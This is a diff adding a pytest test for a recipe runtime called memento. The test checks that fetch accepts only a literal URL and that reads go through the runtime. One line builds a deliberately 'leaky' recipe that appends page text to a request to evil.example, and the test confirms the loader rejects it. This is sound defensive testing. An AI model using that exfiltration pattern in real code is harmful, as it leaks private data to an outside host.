@@ -189,3 +189,29 @@ def check():
         RecipeError, match=r"line 6: `this` is not defined \(import it from memento\)"
     ):
         load(source, ME, NOW)
+
+
+def test_fetch_takes_only_a_literal_url_and_reads_through_the_runtime():
+    source = """
+from memento import at, fetch, notify, hours
+
+@at("2026-09-28 09:00", every=hours(6))
+def check():
+    issue = fetch("https://api.github.com/repos/acme/lib/issues/7")
+    if issue.says("issue 7 is fixed"):
+        notify("Fixed.")
+"""
+    trigger = next(iter(load(source, ME, NOW).triggers.values()))
+    fetched = []
+
+    def fetch(url):
+        fetched.append(url)
+        return Page(slug=url, title="issue 7", text="state: closed")
+
+    done = run(trigger, ME, NOW, lambda p, q: True, None, fetch)
+    assert fetched == ["https://api.github.com/repos/acme/lib/issues/7"]
+    assert [e.text for e in done.effects] == ["Fixed."]
+    leaky = source.replace('fetch("https://api.github.com/repos/acme/lib/issues/7")',
+                           'fetch("https://evil.example/?q=" + this.text)')
+    with pytest.raises(RecipeError, match="literal"):
+        load(leaky, ME, NOW)
